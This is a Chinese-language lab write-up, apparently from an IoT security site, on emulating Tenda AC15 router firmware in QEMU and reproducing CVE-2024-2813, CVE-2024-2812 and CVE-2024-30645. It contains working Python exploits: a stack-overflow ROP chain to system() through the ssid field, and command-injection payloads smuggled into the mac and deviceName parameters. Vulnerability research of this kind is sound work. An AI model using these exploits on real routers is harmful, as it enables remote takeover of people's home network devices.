# Tenda AC15 固件模拟与漏洞复现
> KDEV
> 来源：https://www.iotsec-zone.com/article/482

今天分析固件AC15.
品牌：Tenda
固件名称：US_AC15V1.0BR_V15.03.05.19_multi_TD01
# 0x00 信息收集：

先解包固件：
binwalk -Me US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin
![0.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t1y4x7xahxmwdcf.png)
用firmwalker跑一下
./firmwalker-pro-max.sh ~/Desktop/Firm/_US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-root/ > AC15.txt
![1.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t2bs3u1alfouwky.png)

得知web服务是用httpd实现的。

readelf -h  ./bin/httpd
用readelf查看头信息
![2.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t2pkw0zujsdnjwh.png)
得知架构是ARM小端
checksec分析
checksec --file=httpd
![3.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t2xrgq3sv0dndcg.png)
发现NX保护开启，没开canary。

分析启动项/etc_ro/init.d/rcS
![4.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t41j3qm6blysey9.png)
```bash
cfmd &	#可疑二进制文件，一会分析一下
echo '' > /proc/sys/kernel/hotplug
udevd &	 #任务管理器   
logserver & #日志服务器

tendaupload & #腾达上传服务
if [ -e /etc/nginx/conf/nginx_init.sh ]; then
	sh /etc/nginx/conf/nginx_init.sh
fi

moniter &    #moniter
telnetd &    #telnetd服务
```
将/bin/cfmd拖进IDA查看
在字符表里查找httpd
![5.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t49w1b0gcxecrs7.png)
![6.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t4lewzrgmdb85cm.png)
观察到这里执行了httpd命令
# 0x01 固件模拟（用户）

先使用qemu模拟启动httpd服务
在之前的分析中我们得知是arm小端，所以我们用qemu-arm模拟
启动httpd
先把qemu-arm-static拷贝到squashfs-root文件夹里面，方便使用chroot
cp $(which qemu-arm-static) qemu-arm-static
然后执行
sudo chroot . ./qemu-arm-static ./bin/httpd
![7.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t4xoolo0kl9ymev.png)
一直卡在welcome to 这里。
进IDA查找字符串“welcome to"
![8.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t56m25wkuhcnotu.png)
![9.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t5drzfhu5mfobs9.png)
进动态调试
![10.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t5l66jymamtg8n9.png)
在BL处下断点之后发现程序一直卡在sleep（1）这里
并且观察到R3寄存器始终被check_network 程序赋值为0
程序进入死循环
使用patch修改BGT为B(无条件跳转)

![11.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t5s09vnv5orbfmi.png)
![12.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t5zt5i3bigdaryi.png)
再次调试发现程序停在cfm failed!这里
![13.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t6adbbdoqzsuuyu.png)
再次patch

![14.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t6qi5pwq6l1bpo9.png)

再次运行!

![15.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t73j6cgeglipvvf.png)
发现程序listen ip 255.255.255.255
显然我们不能用这个ip地址访问，所以我们要找到修改这个值的方法
再次回到IDA，查找字符表"listen ip"
![16.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t7eiroadpyfnsdp.png)
发现程序在这里用了一个inet_ntoa（）方法处理了s.sa_data[2]这个值
这显然是一个库函数，通过查找资料得知这个方法的作用是将ip地址转换为十进制带"."的格式的一个方法

![17.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t7r0es65s3yo2kn.png)
继续观察函数发现这个值是从函数的a1参数得来的，按x查看函数的交叉引用
![18.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t8yin14zo7131yj.png)
![19.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t98eiv6o8vqrotb.png)
找到全局变量g_lan_ip
查看包含这个值的函数，试图找到赋值的地方
![20.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t9f3z7c2myp2tob.png)
最后在这里找到了一个库函数getIfIp()
![21.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t9qdg572ip5hcqp.png)
这是一个外部函数，想知道功能只能去动态链接库里面去找
使用readelf -d httpd查询动态链接库的情况
![22.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63t9x7capdrdbq3ka.png)
用grep -ir 查找哪个库里面包含了这两个函数
![23.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63ta2b6cf44rckrer.png)
到IDA里面去看查找getIfip（）和getLanIfName（）这两个函数
在libcommon.so里面找到了getIfIp()
![24.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63ta8kmlc2agrm5wo.png)
![25.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tagvtzr35jkhybv.png)
这个函数的作用是创建一个套接字，然后用ioctl方法获取ip地址，再用strcpy赋值给a2的地址指向的位置，成功就返回0，失败则返回-1
![26.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tarhime7y7sxott.png)
getLanIfName（）则直接调用了get_eth_name(),传入参数为0.
再次查找"get_eth_name"，找到libChipApi.so这个库文件
![27.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tazokwf7widoy7w.png)
拖进IDA
![28.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tbbtkuv8zqducwl.png)
由于参数是0，所以返回值是br0。如此
我们便得到了程序获取ip地址的地点，在br0网卡处获取IP地址
于是我们设置网卡br0就行了
sudo brctl addbr br0
sudo ifconfig br0 192.168.0.1
做完这些之后，我们把webroot_ro文件夹的内容复制到webroot里面，不然网页端会提示page not found
![29.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tbld2gppqiqk169.png)
输入sudo chroot . ./qemu-arm-static ./bin/httpd_1
然后打开浏览器输入192.168.0.1
就能访问web服务了
![30.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tc1zle8empotcsh.png)
![31.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tc5kq5l6bnqkpsz.png)

# 0x02固件模拟（系统）

使用qemu-system-arm程序模拟整个系统，可以模拟整个硬件平台与完整软件操作系统
启动脚本：
#!/bin/sh
qemu-system-arm \
    -M vexpress-a9 \
    -kernel /home/iot/tools/qemu-images/armhf/vmlinuz-3.2.0-4-vexpress \
    -initrd /home/iot/tools/qemu-images/armhf/initrd.img-3.2.0-4-vexpress \
    -drive if=sd,file=/home/iot/tools/qemu-images/armhf/debian_wheezy_armhf_standard.qcow2 \
    -append "root=/dev/mmcblk0p2 console=ttyAMA0" \
    -net nic -net tap,ifname=tap0,script=no,downscript=no \

主机配置网卡：
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.0.4/24 up
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null # 配置NAT（假设物理机外网接口是ens33） 
sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
sudo iptables -A FORWARD -i tap0 -j ACCEPT 
sudo iptables -A FORWARD -o tap0 -j ACCEPT
虚拟机配置网卡：
ip link add br0 type dummy
ifconfig eth0 192.168.0.2/24
ifconfig br0 192.168.0.3/24
在主机这里把squashfs-root文件夹打包
tar -cvf s.tar.gz squashfs-root/
![32.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tda2ll8jjleyywn.png)
用python3 -m http.server开启http服务
然后在从主机上执行wget 192.168.0.4:8000/s.tar.gz
![33.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tdh7eikoae1boyz.png)
从主机解压
tar -xvf s.tar.gz
![34.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tdnlhe2gllpwjad.png)
执行chroot . sh
/bin/httpd
打开浏览器，在地址处输入br0网卡的ip地址192.168.0.3
![35.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tdxnqjm1bfgn4hw.png)
qemu-system模拟成功！
# AC15栈溢出漏洞分析
模拟固件已经搞定了，接下来开始搞AC15的漏洞分析
# 0x03 CVE-2024-2813

漏洞描述：Tenda AC15 15.03.20_multi 中发现漏洞，它已被宣布为关键漏洞。该漏洞影响文件/goform/fast_setting_wifi_set的form_fast_setting_wifi_set函数。对参数 ssid 的操作会导致基于堆栈的缓冲区溢出。
将httpd拖进IDA分析，查找form_fast_setting_wifi_set函数
可以看到截图箭头标注这里执行了两个strcpy函数
我们要利用的就是第一个strcpy，通过构造一个足够长的payload，覆盖掉缓冲区和存放返回地址LR的值，从而实现栈溢出。
![36.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63teqd8vtixlboxqx.png)
先观察变量s和src的栈偏移分别是-0x7c和-0x1c
第一次尝试构造字符串覆盖指针，在IDA里面随便找了个函数的内存地址jump_addr = 0x56A9C
payload = b’a’ *(0x7c) + p32(jump_addr)
编写EXP
```python
from pwn import *
readable_addr = libc_base + 0x64144
jump_addr = 0x56A9C
payload = b'a'*(0x7c) + p32(jump_addr)
url = "http://192.168.0.3/goform/fast_setting_wifi_set"
cookie = {"Cookie":"password=12345"}
data = {"ssid": payload}

response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
```
先尝试让程序跳转到别的地方
用QEMU-SYSTEM模式模拟启动固件httpd
ssh连接虚拟机
ssh root@192.168.0.3
先用ps -aux获取httpd进程pid
![37.png](https://www.iotsec-zone.com/api/image/v2/20241226/d6lp3sgyucucp203ca.png)
然后用gdbserver启动远程gdb调试
	./gdbserver :1234 –attach 2589
本地再打开一个终端窗口，开启GDB调试
	gdb-multiarch -x 1.gdb
![38.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tfq0qv99a0yuthq.png)
断点断在第一个strcpy前面，然后用n单步执行
![39.png](https://www.iotsec-zone.com/api/image/v2/20241226/d6lp6amns9z5ve9wgm.png)
![40.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63thhi6u9k435ybcl.png)
发现执行到第二个strcpy处，程序就弹出了，并没有执行到这个函数的pop指令那里。
原因是src这个char * 指针被覆盖，程序读取到错误的内存之后就崩溃了。
    所以我们需要在覆盖的时候给src指针一个可读的字符串的地址
    位置在0x7c-0x1c=0x60处
    构造payload
    payload = b'a'* (0x60) + p32(readable_addr) + b'b'*(0x20-8)
    
由于strcpy在遇到x00时会截断，所以这个readable_addr需要在libc库里面找
因为这个库加载的顺序比较靠前，所以它的程序基址会比较大，从而可读字符串的地址也会比较大
这样覆盖的payload就不会因为地址里面有“00”而被截断
把libc.so.0拖进IDA，在0x64144这里找到一个字符串“HOME”
![41.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tjb8nib3hg7wl8w.png)
在gdb调试的过程中用vmmap查看libc.so.0的基地址
![42.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tjp7181uehhh7vs.png)
 可以看到这里基地址是0x76d3a000，所以readable_addr的地址就是0x763a000+0x64144
重新构建exp尝试跳转
```python
import requests
from pwn import *
libc_base = 0x76d3a000
readable_addr = libc_base + 0x64144
jump_addr = 0x56A9C
payload = b'a'*(0x60) + p32(readable_addr) + b'b'*(0x20-8) + p32(jump_addr)
url = "http://192.168.0.3/goform/fast_setting_wifi_set"
cookie = {"Cookie":"password=12345"}
data = {"ssid": payload}

response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
```
![43.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tk05mjuam1xv2au.png)
成功执行了第二个strcpy，程序运行到了pop,并且成功跳转到了我们提供的地址

![44.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tkkbsw1dt8gs9sv.png)
有了成功跳转的方法，接下来就是构建ROP链执行我们自己的指令了
使用ROPgadget 找找libc.so.0这个库里面有没有我们能用的指令段
	ROPgadget --binary libc.so.0 --only pop

![45.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tkuwabh1hdbawdh.png)
找到了一个pop {r3 ,pc}的指令，地址是0x18298

![46.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tkypphdvajz3rn8.png)
用同样的方法找到了一个mov r0, sp ;blx r3的地址

![47.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tl601ou51z1i2fj.png)
地址偏移是0x49c64
同时在libc.so.0库里面找到system函数的首地址0x5A270

![48.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tlcf96h6koffjj7.png)
有了这些偏移指令段，就可以开始构建ROP链了
编写EXP
```python
import requests
from pwn import *

target_ip = "192.168.0.3"
target_port = 80 

libc_base = 0x76dab000 
readable_addr = libc_base + 0x64144 #string 'HOME'
system_offset = 0x5A270 
mov_r0_sp__blx_r3__offset = 0x49c64
pop_r3_pc_offset = 0x18298

cmd = b'ps>proc_info.txt'

payload = b'a' * (0x60) + p32(readable_addr) + b'b' * (0x1c-4) 
payload += p32(libc_base + pop_r3_pc_offset)
payload +=  p32(libc_base + system_offset) + 
payload +=p32(libc_base + mov_r0_sp__blx_r3__offset) + cmd

url = f"http://{target_ip}/goform/fast_setting_wifi_set" 
cookie = {"cookie": "password=qpacvb"}

data = {"ssid": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
```
通过栈溢出先跳转到pop {r3, pc}这个地址，这时sp指针指向下一个内存地址也就是system_offset
此时执行的POP r3指令会将system函数的地址加载到r3里面
然后跳转到mov r0 sp,blx r3这里，此时sp指针指向的是我们输入的cmd命令，也就是ps>proc_info.txt
然后blx指令跳转到r3，此时r3里面存储的是system函数的地址，r0存储的是cmd指令
从而完成任意代码执行。
开始动态调试
gdb断点下在了fast_setting_wifi_set这里
这里即将跳转到我们构造的ROP链
![49.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tltc4pzz7u1grfe.png)
成功跳转到pop r3 pc
![50.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63top53c2jzidphl1.png)
观察sp指针可以发现下一跳指向mov r0, sp
![51.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tmt3v4ei5xiw28l.png)
继续c发现程序已经卡在死循环，因为地址被改，跳转的地址没有再变化
![52.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tq4dfjcn5xi5z0f.png)
但是指令已经成功执行了，在ssh端查看
![53.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tnu0lb8alt8zac7.png)
发现指令已经执行，漏洞利用成功。
# 0x04 CVE-2024-2812
漏洞描述：Tenda AC15 15.03.05.18/15.03.20_multi 中发现漏洞。它已被归类为关键。
这会影响文件 /goform/WriteFacMac 的函数 formWriteFacMac。
对参数 mac 的操作会导致操作系统命令注入。可以远程发起攻击。
观察漏洞描述，定位到漏洞点在formWriteFacMac这里
进IDA定位该函数发现没有过滤就拼接了字符串并用doSystemCmd执行
![54.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tqksd34o8qhafpe.png)
尝试构建EXP
```py
import requests
from pwn import*

ip = "192.168.0.3"
url = "http://" + ip + "/goform/WriteFacMac"
payload = ";echo 1 > /tmp/proc.txt"

data = {"mac": payload}
cookie = {"cookie": "password=lyucvb"}
response = requests.post(url, cookies=cookie,data=data)
print(response.text)
```
执行python3 cve-2024-2812.py
![55.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tqu90hoc2zjs1he.png)
查看tmp文件夹，ls tmp
可以看到指令执行成功
![56.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63tqzob5nvxoaudrp.png)
# 0x05 CVE-2024-30645
漏洞描述：Tenda AC15V1.0 V15.03.20_multi存在通过deviceName参数的命令注入漏洞。
和CVE-2024-2812一样，都是通过用户提供的参数产生的命令注入漏洞导致的系统命令执行
进IDA查看formsetUsbUnload函数
![57.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63trd3do2c2knohll.png)
根据函数尝试编写EXP
```py
import requests
from pwn import *

target_ip = "192.168.0.3"
url = "http://" + target_ip + "/goform/setUsbUnload"

payload = ";echo 123 > ./webroot/zzz.txt"
data = {"deviceName":payload}
cookie = {"cookie": "password=qpacvb"}
requests.post(url,cookies=cookie,data=data)
requests.post(url,cookies=cookie,data=data)

confir_url ="http://"+ target_ip + "/zzz.txt"
r = requests.get(confir_url)
print(r.text) 
```
执行python脚本
![58.png](https://www.iotsec-zone.com/api/image/v2/20241205/d63trju16rdbq1fo7x.png)
成功写入文件并访问成功
